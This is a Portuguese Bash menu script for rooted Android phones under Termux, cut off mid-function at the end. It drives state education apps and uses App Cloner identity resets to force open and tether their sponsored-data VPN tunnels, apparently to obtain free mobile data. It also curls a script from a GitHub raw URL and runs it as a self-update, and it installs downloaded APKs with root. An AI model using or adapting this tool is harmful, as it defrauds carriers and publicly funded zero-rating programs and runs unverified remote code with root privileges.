#!/bin/bash
clear

BrancoAll='\e\033[03;37;47m'
LETRAPRETA='\e\033[02;30;47m'
BRANCO='\033[1;29m'
VermelhoAll='\e[01;37;41m'
NADA='\033[0m'
CINZA='\e[02;37m'
DESTACAR='\e[01;37m'
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
SCOLOR='\033[0m'
SEMCOR='\033[8m'
MenuPrincipal(){
clear
echo -e '\n'
echo "     ==================================="
echo "                MENU PRINCIPAL     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ===================================" 
echo -e "            ${DESTACAR}[ 1 ] - Apps Escola ${CINZA}ROOT${NADA}"
echo -e "            ${DESTACAR}[ 2 ] - Rotear VPN ${CINZA}ROOT${NADA}"
echo -e "            ${DESTACAR}[ 3 ] - Outros"
echo -e "            ${DESTACAR}[ 4 ] - X9 de Arquivos ${CINZA}ROOT${NADA}"
echo -e "            ${DESTACAR}[ 5 ] - MBs Free"
echo -e "            ${DESTACAR}[ 6 ] - Modulos V2ray Magisk ${CINZA}ROOT${NADA}"
echo -e "            ${DESTACAR}[ 7 ] - Atualizar"
echo -e "            ${DESTACAR}[ 0 ] - Sair${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in  
    1)Menu1;;
    2)Menu2;;
    3)Menu3;;
    4)Menu4;;
    5)Main5;;
    7)Menu6;;
    6)MagiskRay;;
    0)killall com.termux ;clear ; exit;;
    *) echo ; MenuPrincipal;;
    esac
     }

Menu6(){ 
clear
echo -e "${DESTACAR}ATUALIZE DIARIAMENTE..."
echo
echo -e "${DESTACAR}1 - ATUALIZAR"
echo -e "${DESTACAR}0 - VOLTAR${NADA}"
echo
read -n1 -p "Escolha uma Opção: " optione12 ; case $optione12 in 
1);;
0)MenuPrincipal;;
*)Menu6;;
esac

echo
echo
echo -e "${DESTACAR}LIGUE A INTERNET${NADA}"
echo
read -n1 -p "DIGITE Y DEPOIS DE LIGAR" optione12 ; case $optione12 in 
  y)echo ; echo ; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/force && chmod +x force && cp force $PREFIX/bin/  ; echo -e "${GREEN}SCRIPT ATUALIZADO COM SUCESSO${NADA}"; sleep 5 ;./force;;
  
  Y)echo ; echo ; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/force && chmod +x force && cp force $PREFIX/bin/  ; echo -e "${GREEN}SCRIPT ATUALIZADO COM SUCESSO${NADA}"; sleep 5 ; ./force;;
  *)MenuPrincipal;;
  esac
}



Menu1() {
check() {
    su=$(su -h | grep -c "command")
    case $su in
    0) killall com.termux ; clear ; exit ;;
    1) clear;;
    esac
}
echo -e '\n'
check
    clear
echo "     ==================================="
echo "             FORÇAR CONEXÃO (ROOT)     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - CMSP"
echo -e "            [ 2 ] - CMSP KIDS"
echo -e "            [ 3 ] - Aulas Parana"
echo -e "            [ 4 ] - Applique-se"
echo -e "            [ 5 ] - Rio Educa Em Casa"  
echo -e "            [ 6 ] - Permições VPN"
echo -e "            [ 7 ] - Loop De Conexão"
echo -e "            [ 8 ] - Conexão Alternativa"
echo -e "            [ 9 ] - Baixar Apps"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in  
   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";; 
    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
    6) PermiçõesVPN;;
    7) LoopDeConexão;;
    8) ConexãoAuternativa;;
    9) BaixarApps;;
    0) MenuPrincipal;;
    *) echo ; Menu1;;
    esac
    connect
    }



ConexãoAuternativa(){
clear
echo -e '\n'
echo "     ==================================="
echo "             FORÇAR CONEXÃO (ROOT)     "
echo "        ==================================="
echo "            USE ESSE CASO O OUTRO"
echo "            NÃO ESTEJA FUNCIONANDO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - CMSP"
echo -e "            [ 2 ] - CMSP KIDS"
echo -e "            [ 3 ] - Aulas Parana"
echo -e "            [ 4 ] - Applique-se"
echo -e "            [ 5 ] - Rio Educa Em Casa"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in  
   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";; 
    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
    0) Menu1;;
    *) echo ; ConexãoAuternativa;;
    esac
    connectodd
    }

connectodd(){
clear
su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name $App --ez delete_app_data true && sleep 10 && clear && su -c pm clear $App && $A4 && sleep 4 && $A3
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) sleep 2 ; check2;;
    1)  su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && su -c am start -n com.termux/com.termux.HomeActivity && clear && su -c am startservice -n $App/tv.ip.my.controller.MyMainService && su -c am stopservice -n $App/tv.ip.my.controller.MyMainService && su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && sleep 4 && su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && sleep 1 ; clear ; echo "AGORA REMOVA O APP DE RECENTES" && sleep 10 && su -c killall $App
     esac
}
check2
su -c am startservice -n $App/de.blinkt.openvpn.core.OpenVPNService && su -c killall com.termux
}

PermiçõesVPN(){
    clear
echo -e '\n'
echo "      ==================================="
echo "              FORÇAR CONEXÃO (ROOT)     "
echo "         ==================================="
echo "               ESCOLHA UM APP PARA"
echo "               PEDIR PERMIÇÕES VPN"
echo 
echo "         ==================================="
echo -e "             ${DESTACAR}[ 1 ] - CMSP"
echo -e "             [ 2 ] - CMSP KIDS"
echo -e "             [ 3 ] - Aulas Parana"
echo -e "             [ 4 ] - Applique-se"
echo -e "             [ 5 ] - Rio Educa Em Casa"  
echo -e "             [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in  
   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";; 
    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
    0) Menu1;;
    *) echo ; PermiçõesVPN;;
    esac
    connectid
    }


connectid () {
clear
su -c am start -n $App/tv.ip.my.activities.PermissionActivity && sleep 2 && $A2 && sleep 6 && su -c pm clear $App && Menu1
}

LoopDeConexão(){
clear
echo -e '\n'
echo "     ==================================="
echo "             LOOP DE CONEXÃO (ROOT)     "
echo "        ==================================="
echo "                 ESCOLHA UM APP"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - CMSP"
echo -e "            [ 2 ] - CMSP KIDS"
echo -e "            [ 3 ] - Aulas Parana"
echo -e "            [ 4 ] - Applique-se"
echo -e "            [ 5 ] - Rio Educa Em Casa"  
echo -e "            [ 6 ] - Todos os apps"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in  
   1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 " ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";;
    2) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi";;
    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 " ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr";;
    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese";; 
   5) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca";;
    6) App6;;
    0) Menu1;;
    *) echo ; LoopDeConexão;;
    esac
    connected
    }


App6(){
clear 
echo "PARA FUNCIONAR CORRETAMENTE É NECESSARIO" ; echo "TER TODOS OS APPS DE CONEXÃO FORÇADA," ; echo "DEIXAR O TERMUX EM SEGUNDO PLANO" ;  sleep 10 && clear && echo "PEDINDO AS PERMIÇÕES DE VPN DE" ; echo "TODOS OS APPS, POR FAVOR ACEITE" &&
su -c am start -n tv.ip.edusp/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.edusp && su -c am start -n tv.ip.cmspi/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.cmspi && su -c am start -n tv.ip.aulapr/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.aulapr && su -c am start -n tv.ip.appliquese/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c pm clear tv.ip.appliquese && su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity && sleep 6 && su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.edusp --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.edusp && su -c am start -n tv.ip.edusp/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.edusp/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2 && sleep 40
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) clear;;
    1) su -c killall tv.ip.edusp;;
     esac
}
check2
check3() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) sleep 2 ; check3;;
    0) su -c pm clear tv.ip.edusp && clear;;
     esac
}
check3
su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.cmspi --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.cmspi && su -c am start -n tv.ip.cmspi/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.cmspi/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity && sleep 40
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) clear;;
    1) su -c killall tv.ip.cmspi;;
     esac
}
check2
check3() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) sleep 2 ; check3;;
    0) su -c pm clear tv.ip.cmspi && clear;;
     esac
}
check3
su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.aulapr --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.aulapr && su -c am start -n tv.ip.aulapr/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.aulapr/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2 && sleep 40
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) clear;;
    1) su -c killall tv.ip.aulapr;;
     esac
}
check2
check3() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) sleep 2 ; check3;;
    0) su -c pm clear tv.ip.aulapr && clear;;
     esac
}
check3
su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.appliquese --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.appliquese && su -c am start -n tv.ip.appliquese/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.appliquese/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2 && sleep 40
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) clear;;
    1) su -c killall tv.ip.appliquese;;
     esac
}
check2
check3() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) sleep 2 ; check3;;
    0) su -c pm clear tv.ip.appliquese && clear;;
     esac
}
check3
su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name tv.ip.rioeduca --ez delete_app_data true && sleep 10 && clear && su -c pm clear tv.ip.rioeduca && su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n tv.ip.rioeduca/tv.ip.my.controller.MyMainService && su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2 && sleep 40 
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) clear;;
    1) su -c killall tv.ip.rioeduca;;
     esac
}
check2
check3() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    1) sleep 2 ; check3;;
    0) su -c pm clear tv.ip.rioeduca && clear;;
     esac
}
check3
clear && App6
}


connected() {
clear
su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name $App --ez delete_app_data true && sleep 10 && sleep 18 && clear && su -c pm clear $App && su -c am start -n $App/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n $App/tv.ip.my.controller.MyMainService && $A3
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) sleep 2 ; check2;;
    1) su -c am stopservice -n $App/tv.ip.my.controller.MyMainService && su -c killall $App
     esac
}
check2
check9() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) connected;;
    1) sleep 2 ; check9;;
     esac
}
check9
}

BaixarApps(){
clear
echo -e '\n'
echo "      ==================================="
echo "               FORÇAR CONEXÃO (ROOT)     "
echo "         ==================================="
echo "           ESCOLHA UM APP PARA BAIXAR"
echo
echo "         ==================================="
echo -e "             ${DESTACAR}[ 1 ] - CMSP"
echo -e "             [ 2 ] - Rio Educa Em Casa"
echo -e "             [ 3 ] - Aulas Parana"
echo -e "             [ 4 ] - Applique-se" 
echo -e "             [ 5 ] - CMSP Kids"
echo -e "             [ 0 ] - Voltar${NADA}"
echo "        ==================================="
echo
    read -n1 -p "Escolha uma Opção: " App
    case $App in  
    1) App="tv.ip.edusp" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.edusp/tv.ip.my.activities.VideoActivity2" ; nome="CentroDeMidiasSP" ; A2="su -c am start -n tv.ip.edusp/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.edusp/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.edusp" ; eb="su -c pm enable tv.ip.edusp";E1="17";;
    2) App="tv.ip.rioeduca" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.VideoActivity2" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.rioeduca/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.rioeduca/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.rioeduca" ; eb="su -c pm enable tv.ip.rioeduca"; E1="18";;
    3) App="tv.ip.aulapr" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.VideoActivity2" ; nome="AulaParana" ; A2="su -c am start -n tv.ip.aulapr/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.aulapr/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.aulapr" ; eb="su -c pm enable tv.ip.aulapr"; E1="19";;
    4) App="tv.ip.appliquese" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.VideoActivity2" ; nome="Applique-se" ; A2="su -c am start -n tv.ip.appliquese/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 4" ; A4="su -c am start -n tv.ip.appliquese/tv.ip.my.activities.SplashScreen" ; db="su -c pm disable tv.ip.appliquese" ; eb="su -c pm enable tv.ip.appliquese"; E1="20";;
     5) App="tv.ip.cmspi" ; atividade="tv.ip.my.activities.SplashScreen" ; A3="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.MyVideoActivity" ; nome="RioEducaEmCasa" ; A2="su -c am start -n tv.ip.cmspi/com.datami.smi.ui.VpnPermissionActivity" ; s="sleep 8" ; A4="su -c am start -n tv.ip.cmspi/tv.ip.my.activities.SplashScreen " ; db="su -c pm disable tv.ip.cmspi" ; eb="su -c pm enable tv.ip.cmspi" ; E1="22";;
    0) Menu1;;
    *) BaixarApps;;
    esac
    connectar
}

connectar () {
clear
check(){
      appk=$(test -f "$HOME/$E1.apk" && echo 1)
    case $appk in
    1) su -c rm -f $HOME/$E1.apk && clear;;
    *) echo "BAIXANDO..." ; curl -sO https://raw.githubusercontent.com/luanwillianzh/vpn/main/$E1.apk && chmod +x $E1.apk && clear && echo "BAIXADO COM SUCESSO!" ; sleep 3 && clear  ;;
    esac
}
check
check(){
      apps=$(test -d "/data/data/$App" && echo 1)
    case $apps in
    1) echo "DESINSTALANDO SEU APP..." && su -c pm uninstall $App && echo ; echo "INSTALANDO O NOVO APP..." ; su -c pm install $HOME/$E1.apk ;;
    *) echo "INSTALANDO O NOVO APP..." ; su -c pm install $HOME/$E1.apk;;
     esac
}
check
check(){
      apps=$(test -d "/data/data/$App" && echo 1)
    case $apps in
    1) clear;;
    *) termux-open $HOME/$E1.apk;;
     esac
}
check
Menu1
}

connect(){
clear
su -c am broadcast -p com.applisto.appcloner -a com.applisto.appcloner.api.action.NEW_IDENTITY --es package_name $App --ez delete_app_data true && sleep 10 && clear && su -c pm clear $App && su -c am start -n $App/tv.ip.my.activities.PermissionActivity && sleep 1 && su -c am startservice -n $App/tv.ip.my.controller.MyMainService && $A3
check2() {
    vpn=$(ifconfig | grep -c tun0)
    case $vpn in
    0) sleep 2 ; check2;;
    1) su -c am stopservice -n $App/tv.ip.my.controller.MyMainService && su -c killall $App
     esac
}
check2
su -c killall com.termux
}


Menu2() {
    clear
echo -e '\n'
echo "     ==================================="
echo "               ROTEAR VPN (ROOT)     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - Via Roteador Wi-Fi"
echo -e "            [ 2 ] - Via USB"
echo -e "            [ 3 ] - Via Bluetooth"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " Apps
    case $Apps in  
   1)WIFI;;
   2)USB;;
   3)Bluetooth;;
   0) MenuPrincipal;;
   *) Menu2;;
    esac
    }

WIFI(){
clear
echo -e '\n'
echo "     ==================================="
echo "              VIA ROTEADOR WI-FI     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - Metodo 1"
echo -e "            [ 2 ] - Metodo 2"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " Apps
    case $Apps in  
    1)MetodoWIFI1;;
    2)MetodoWIFI2;;
    0)Menu2;;
    *)WIFI;;
     esac
     }


MetodoWIFI1(){
GREEN='\033[1;32m'
SCOLOR='\033[0m'
su -c 'svc wifi disable' && sleep 4
check1() {
    vpn=$(su -c ifconfig | grep -c wlan0)
    case $vpn in
    0) clear ; echo "Roteador Wi-Fi não está ligado" ; echo "Ligue ou tente o metodo 2" ; sleep 4 ; Menu2;;
    1) clear;;
     esac
}
check1
check5(){
      apps=$(cat wifiip1 | grep -c .)
    case $apps in
     1) clear;;
     2)clear;;
     3)clear;;
     4)clear;;
     *)su -c rm wifiip1 ; su -c ifconfig wlan0 | grep "inet addr" | grep -o inet............................... | cut -d' ' -f1-2 | cut -d':' -f2 | cut -d'.' -f1-4 >> wifiip1;;
     esac
}
check5
clear
echo -e '\n'
echo "     ==================================="
echo "              VIA ROTEADOR WI-FI     "
echo "        ==================================="
echo "               ESCOLHA UMA OPÇÃO"
echo
echo "        ==================================="
echo -e "            ${DESTACAR}[ 1 ] - Ligar"
echo -e "            [ 2 ] - Desligar"
echo -e "            [ 0 ] - Voltar${NADA}"
echo "         ==================================="
echo
echo "@alpacinoo007"
echo "@luanw04"
echo
    read -n1 -p "Escolha uma Opção: " Apps
    case $Apps in  
   1)AltRW1;;
   2)AltRW2;;
   0)WIFI;;
   *) MetodoWIFI1;;
    esac
    }



AltRW1(){
clear
check2() {
    vpn=$(su -c ifconfig | grep -c tun0)
    case $vpn in
